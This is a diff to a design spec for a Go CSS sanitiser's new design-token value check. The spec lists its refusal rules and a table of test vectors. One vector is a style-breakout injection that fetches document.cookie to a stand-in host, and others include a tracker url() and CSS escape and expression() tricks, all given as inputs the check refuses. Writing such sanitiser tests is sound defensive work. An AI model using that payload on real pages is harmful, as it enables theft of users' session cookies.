@@ -23,6 +23,9 @@ The inline-CSS tokenizer is ours (G1: `tdewolff/parse` would need a download).
 - `canvas/dialect/parse.go`, `css.go`, `allowlist.go`, `svg.go`, `report.go`, `checker.go`,
   `gen.go` (`//go:generate`), `allowlist.json` (generated, committed) — new
 - `canvas/dialect/*_test.go`, `testdata/*.html` — new
+- `canvas/dialect/testdata/token-vectors.jsonl` — new: one JSON array `["<type>", "<value>"]` per
+  line (JSON, so a control character is expressible), every one refused; read by `TestTokenValue_refusals` here and by task 23's `allowedTokenValue.test.ts`, so
+  the Go and TS token checks refuse the same set (review I2)
 - `canvas/go.mod` — `require golang.org/x/net v0.26.0`; `canvas/go.sum`
 
 ## Contracts
@@ -128,6 +131,9 @@ dimensions, percentages, hashes, strings, functions, commas, slashes, whitespace
 `expression`, `javascript:`, `behavior`, `-moz-binding`, a function not in `Functions`, or a
 `url()` whose target is not an `asset:sha256-…` ref (a `data:image/…` URL is decoded into an asset
 and rewritten to its ref). Property names are lowercased; `!important` is stripped and reported.
+**A token's value gets these same refusals and more** (`Checker.TokenValue` below, review I2): a
+token is written into ExportHTML's `<style>`, into `tokens.css` and through the renderer's
+`setProperty`, none of which a declaration check guards.
 
 ```go
 // canvas/dialect/allowlist.go
@@ -318,7 +324,47 @@ func SanitiseSVG(nodeID, markup string) (canonical string, report Report, err er
 type Checker struct{ Tokens map[string]doc.Token } // Tokens only for warnings
 
 func (Checker) Style(property, value string) error
+
+// TokenValue is a token value's whole check (review I2). A token's value reaches
+// three places no declaration check guards: ExportHTML's <style> element (task
+// 08), tokens.css (task 09) and the renderer's setProperty on :root (task 24).
+// So, in order, it refuses:
+//   1. everything the "Inline CSS" global refusals refuse in a declaration value
+//      (backslash, < > { } @, expression, javascript:, behavior, -moz-binding, a
+//      function not in Functions), through the same css.go tokenizer;
+//   2. plus ";" and "!" (a token is one value, never a second declaration or
+//      !important), a comment, an unterminated string or bad-url token, and any
+//      control character (U+0000–U+001F, U+007F);
+//   3. plus ANY url(). Deviation from the review's "a url() must be an asset: ref",
+//      declared: none of the ten token types takes an image, and an asset: ref in
+//      a token would need the asset rewrite in ExportHTML's <style>, tokens.css and
+//      setProperty as well — three new paths for a value no type accepts;
+//   4. then the type, by TokenRules. font-family is NOT RuleAny: it is a comma
+//      list of quoted strings or identifier sequences, nothing else (the review's
+//      payload rode "any").
+// Refusal reasons are one sentence each, surfaced by set_tokens' `dropped` (task 17).
 func (Checker) TokenValue(t doc.TokenType, value string) error
+
+// ErrUnsafeToken is what the writers that re-check tokens before output wrap
+// (serialize.ExportHTML, task 08; tokens.CSS and tokens.DTCG, task 09). It lives
+// here so neither package imports the other.
+var ErrUnsafeToken = errors.New("dialect: a token value fails the dialect")
+
+// TokenRules is TokenValue's step 4, one rule per doc.TokenType.
+var TokenRules = map[doc.TokenType]Rule{
+	doc.TokenColor: RuleColor, doc.TokenRadius: RuleLength, doc.TokenSpacing: RuleLength,
+	doc.TokenContainer: RuleLength, doc.TokenBreakpoint: RuleLength, doc.TokenFontSize: RuleLength,
+	doc.TokenLetterSpacing: RuleLength,      // plus the keyword normal
+	doc.TokenFontWeight:    RuleNumber,      // 1–1000, or normal | bold | lighter | bolder
+	doc.TokenLineHeight:    RuleNumberOrLength, // below
+	doc.TokenFontFamily:    RuleFamilyList,     // below
+}
+const (
+	RuleFamilyList     Rule = "family-list"      // ("<string>" | <ident>+) ("," …)*; tokens only
+	RuleNumberOrLength Rule = "number-or-length" // a number, a RuleLength value, or normal; tokens only
+)
+// allowlist.json carries TokenRules as "tokenRules" (below), so the renderer's
+// re-check (task 23 allowedTokenValue) applies the same four steps.
 // SVG refuses markup from which SanitiseSVG(nodeID, markup) would drop anything
 // (a non-empty report or an error: a bypass of the parser, never silently
 // repaired), and otherwise returns the canonical form, which doc stores (task 06).
@@ -339,6 +385,7 @@ func CheckDeclaration(property, value string) (kept bool, drop *Drop)
   "keywords": { "display": ["flex", "…"] },
   "functions": ["rgb", "…"],
   "tags": { "artboard": ["div"], "frame": ["div", "…"], "text": ["p", "…"], "image": ["img"], "svg": ["svg"] },
+  "tokenRules": { "color": "color", "font-family": "family-list", "line-height": "number-or-length", "…": "…" },
   "attrs": { "*": ["aria-label"], "input": ["type", "placeholder", "value", "checked"] } }
 ```
 
@@ -370,7 +417,8 @@ func CheckDeclaration(property, value string) (kept bool, drop *Drop)
 | `TestParse_twoSVGs` | an artboard's HTML with two Figma-style icons, both `id="paint0_linear"` → two svg nodes whose canonical markup shares no id (every `id="…"` value across both is distinct) | the review I8 scenario end to end in Go |
 | `TestChecker_SVG` | `Checker.SVG(id, SanitiseSVG(id, m))` returns the same string; `Checker.SVG(b, SanitiseSVG(a, m))` returns `SanitiseSVG(b, m)` (re-prefixed, not refused); markup with `<script>` or `onload` errs (a drop is a refusal, never a repair) | the authority silently repairing a bypass, or refusing every duplicate |
 | `TestChecker_implementsDoc` | `var _ doc.Checker = dialect.Checker{}`; `Style("margin","0")` errs | the authority checking with a different list than the parser |
-| `TestTokenValue` (table, one row per token type) | `color: #2fb3bd` ✓, `color: 12px` ✗, `font-weight: 650` ✓, `radius: 8px` ✓, `line-height: 1.4` ✓ | a type check that accepts anything |
+| `TestTokenValue` (table, one row per token type) | `color: #2fb3bd` ✓, `color: 12px` ✗, `font-weight: 650` ✓, `radius: 8px` ✓, `line-height: 1.4` ✓, `font-family: "Inter", system-ui, sans-serif` ✓ | a type check that accepts anything |
+| `TestTokenValue_refusals` (table; `testdata/token-vectors.jsonl`, **shared with task 23's `allowedTokenValue.test.ts`**) | refused, each under the type its prefix names (the review's two are also refused under every other of the ten types, so no type's rule can let them through): the review's two values — `font-family: red}</style><script>fetch('https://x.example/?'+document.cookie)</script><style>` and `font-family: url(https://tracker.example/p.png)` — and `color: red; background: url(https://x)`, `color: red !important`, `color: url(asset:sha256-<64 hex>)` (step 3), `radius: 8px /*`, `font-family: "Inter`, `color: \72 ed`, `spacing: expression(1)`, a value holding U+000A; `font-family: attr(x)` and `font-family: var(--a)` refused by step 4 (a family list holds no function) | a token value that reaches `<style>`, `tokens.css` or `setProperty` without the checks a declaration gets (review I2) |
 | `TestAllowlistJSON_upToDate` | regenerating in memory equals the committed `allowlist.json` byte for byte | the TS renderer's copy drifting from Go (task 23 checks the other side) |
 
 ## Steps
